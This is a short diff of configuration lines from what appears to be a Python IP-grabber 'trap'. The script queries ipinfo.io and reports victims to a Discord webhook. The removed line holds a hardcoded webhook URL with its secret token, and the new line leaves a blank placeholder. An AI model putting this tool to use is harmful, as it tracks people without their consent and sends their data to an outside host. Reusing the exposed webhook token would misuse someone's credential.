@@ -1,7 +1,7 @@
 import requests, json
 
-hi = "https://ipinfo.io/json"
-discord_webhook = "https://discord.com/api/webhooks/912646579712827413/bVSBQCglqNh3FHqFQdASLcfGoGyPXUd1PEkiZOp1uoMO2od78oE6_3atw2hqR_dD6Kmj"
+hi = "https://ipinfo.io/json" #Don't change this
+discord_webhook = "" #Put your discord webhook here
 
 ping_everyone = "False" #Change this to True if you want to mention @everyone when someone trapped
 
